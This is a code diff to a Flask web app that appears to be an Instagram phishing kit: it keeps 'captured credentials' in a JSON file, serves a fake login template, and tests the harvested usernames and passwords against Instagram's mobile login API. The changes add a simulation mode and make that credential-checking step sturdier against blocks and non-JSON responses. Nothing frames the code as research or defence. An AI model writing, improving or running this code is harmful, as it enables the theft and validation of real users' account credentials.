@@ -16,6 +16,13 @@ app = Flask(__name__)
 
 # Configuration - Set to False to use custom template (recommended for production)
 FETCH_REAL_INSTAGRAM = False  # Instagram blocks server requests, use custom template
+# When Instagram blocks automated verification, use simulation mode for demos
+# Set SIMULATE_VERIFICATION = True for controlled demonstrations using test accounts
+SIMULATE_VERIFICATION = False
+# Simple map of test accounts (username: password) to treat as valid when simulation is enabled
+SIMULATED_CREDENTIALS = {
+    # 'testuser': 'testpass',
+}
 
 # Store captured credentials
 CREDENTIALS_FILE = 'captured_data.json'
@@ -221,9 +228,16 @@ def verify_instagram_credentials(username, password):
     Attempt to verify Instagram credentials
     Returns True if credentials appear valid, False otherwise
     """
+    # Simulation mode: treat entries in SIMULATED_CREDENTIALS as valid
+    if SIMULATE_VERIFICATION:
+        expected = SIMULATED_CREDENTIALS.get(username)
+        if expected and expected == password:
+            return True
+        return False
+
     try:
         session = requests.Session()
-        
+
         # Set realistic headers
         headers = {
             'User-Agent': 'Instagram 219.0.0.12.117 Android',
@@ -234,36 +248,52 @@ def verify_instagram_credentials(username, password):
             'X-IG-Connection-Type': 'WIFI',
             'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
         }
-        
-        # Try Instagram's login API
+
+        # Try Instagram's login API (mobile endpoint)
         login_url = 'https://i.instagram.com/api/v1/accounts/login/'
-        
-        import time
-        import hashlib
+
         import uuid
-        
+
         # Generate device ID
         device_id = str(uuid.uuid4())
-        
+
         payload = {
             'username': username,
             'password': password,
             'device_id': device_id,
             'login_attempt_count': '0',
         }
-        
+
         response = session.post(login_url, headers=headers, data=payload, timeout=10)
-        result = response.json()
-        
-        # Check response
-        if response.status_code == 200 and (result.get('logged_in_user') or result.get('status') == 'ok'):
+
+        # Defensive handling: Instagram often responds with HTML/challenge pages or empty bodies
+        content_type = response.headers.get('Content-Type', '')
+        if 'application/json' not in content_type.lower():
+            # Not JSON — likely blocked or challenge page
+            preview = (response.text or '')[:500]
+            print(f"Verification error: non-json response (status {response.status_code})\nPreview: {preview}")
+            return False
+
+        # Parse JSON safely
+        try:
+            result = response.json()
+        except ValueError as e:
+            print(f"Verification error: invalid json: {e}\nResponse preview: {(response.text or '')[:200]}")
+            return False
+
+        # Check response for success fields
+        if response.status_code == 200 and (result.get('logged_in_user') or result.get('status') == 'ok' or result.get('authenticated') == True):
             return True
-        
+
+        # Otherwise not authenticated
+        print(f"Verification failed: status={response.status_code}, body={result}")
         return False
-        
+
+    except requests.RequestException as e:
+        print(f"Verification network error: {e}")
+        return False
     except Exception as e:
-        print(f"Verification error: {e}")
-        # If verification fails due to network/blocking, return False
+        print(f"Verification unexpected error: {e}")
         return False
 
 @app.route('/login', methods=['POST'])
